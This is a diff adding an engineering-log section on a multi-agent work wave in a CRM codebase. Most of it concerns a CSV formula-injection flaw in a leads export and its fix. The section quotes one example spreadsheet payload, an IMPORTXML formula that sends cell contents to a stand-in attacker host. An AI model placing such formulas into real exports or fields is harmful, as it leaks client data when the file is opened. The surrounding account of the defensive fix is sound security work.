@@ -2217,6 +2217,86 @@ paths (the tick-overrun alert, the lease-release failure) whose only test was "h
 fires in production". They have tests now, and `dial-path` holds 123 while growing from
 500 statements to 547.
 
+## §54 — five slices that could proceed, and the export nobody had armed
+
+Five agents, one whole slice each. Chosen on one criterion: **nothing here is blocked on
+the Bolna pilot or on a founder decision.** That criterion is worth keeping, because the
+audit that opened this wave found the roadmap's real position — the code is complete
+through M1 and M2 and into M3, and **Gate G0 has never been attempted**: the pilot
+scorecard in `docs/evidence/` is an unfilled template, not one field, neither verdict box
+ticked. So the build is far ahead of the sequence on the code axis and at zero on the
+vendor axis, and the useful work is whatever does not need a vendor.
+
+**The wave's most serious finding was a vulnerability, and the obvious fix for it was
+wrong.** `crm/service.py::_csv_value` wrote caller-supplied extraction values into
+`/leads/export.csv` with no formula guard, while `integrations/service.py::_disarm`
+guarded the byte-identical value on the Sheets path. A caller chooses their own name;
+that name becomes a cell, and `=IMPORTXML("https://attacker.example"&A1,"//x")` executes
+when the client opens their own leads in Excel. Verified before fixing, not assumed.
+
+The obvious remedy — reuse `_disarm` — would have been a defect. The leading apostrophe
+is *Google Sheets'* "this is text" marker, which Sheets consumes; a CSV has no such
+convention, so Excel shows the quote and every ordinary value beginning `-` grows a stray
+character in the client's own data. OWASP's Excel remedy is a TAB (0x09) **inside the
+quoted field**, which in turn forced `csv.writer` to `QUOTE_ALL` — unquoted, the tab is
+not reliably part of the value and the mitigation stops mitigating. So "one way per
+problem" here meant sharing the DANGER and not the remedy: one `FORMULA_LEADERS` list
+(including the full-width forms that are leaders in some locales), two renderings, each
+naming its consumer. **The rule that generalises: when two call sites look identical,
+check whether their CONSUMERS are, before making them share code.**
+
+**The test that found it was also wrong, and that is the more interesting half.** Its
+assertion forbade a leading tab alongside the formula leaders — so OWASP's remedy read as
+a violation of itself. `\t` and `\r` belong in the leader set because a value ARRIVING
+with one is suspicious; neither executes. Conflating *what we refuse to accept* with
+*what we refuse to emit* is the confusion, and it is easy to write.
+
+**The strict-xfail pattern earned its keep.** The red-team slice could not edit `apps/`,
+so it recorded the finding as `xfail(strict=True)` asserting the DESIRED behaviour. The
+fix lifted the marker without changing a line of the assertion. An xfail asserting today's
+bug would have had to be rewritten by whoever fixed it, and would have read as if the bug
+were the specification.
+
+**Three slices refused rather than half-wiring, and each refusal is more useful than the
+feature would have been.** A/B testing covers outbound and REFUSES an inbound-only
+experiment, because inbound call rows are created where no experiment is consulted and a
+screen reading "not enough data" forever is worse than a missing button. The intake draft
+drew its line between structural validation (still enforced) and completeness blockers
+(the whole point of a draft) — and the reason is not tidiness: the read parses the stored
+sheet back through the same model, so an unvalidated sheet returns `None` and the next
+resume renders a blank form OVER stored answers, with the operator's retyping as the
+payload. And the QA report refuses to print a percentage under twelve scenarios.
+
+**The statistics were searched, not recalled, and the number is load-bearing.**
+`MIN_CALLS_PER_VARIANT = 40` comes from Fagerland/Lydersen/Laake's coverage result for
+Newcombe's hybrid interval, not from taste; Wilson replaces Wald because Brown/Cai/
+DasGupta measured Wald's coverage "oscillating wildly" at exactly our sample sizes. Below
+the minimum, no comparison is published at all — not a wide one, not a hedged one — and
+the leader is labelled "ahead so far" with no badge. A wrong significance claim on a
+sales-facing number is worse than no number.
+
+**A guardrail was crashing rather than judging.** `check_wiring.unmounted_routers` read
+`.endpoint` off every entry of `router.routes`, and a nested `include_router` leaves a
+marker there that has none — so the guard raised AttributeError. That is the worst failure
+mode for executable governance: it reads as a broken tool rather than a finding, and the
+reflex is to route around the guard. A slice hit it, worked around it correctly, and
+reported it; the crash was still ours.
+
+**Four of five agents caught their own broken experiment this wave** — a UI sabotage the
+server already made unobservable, a cross-tenant sabotage RLS made unreachable, a language
+default that only ever appeared on the wire, a defect count compared against another zero.
+Each was traced and the test strengthened. **And I ran a worthless one myself**: stripping
+`FOR UPDATE` from what turned out to be a docstring, which passed and briefly looked like
+an agent had overclaimed. Against the real statement the test failed as reported. The
+method is only as good as the care taken with the sabotage itself.
+
+**What this wave adds to the method.** §53 asked what a pixel claims when the server does
+not answer. This one asks: **when two paths carry the same value, is the difference between
+them a detail or the whole point?** The CSV and the Sheet, the accept-check and the
+emit-check, the derived bucket and the stored one, the draft and the submission — every
+defect above is two things that looked alike being treated as one, or two things that
+looked different being treated as separate.
+
 ## State of the system — what a future session inherits
 
 Written after the sweep above, grep-verified against the tree at this commit, and
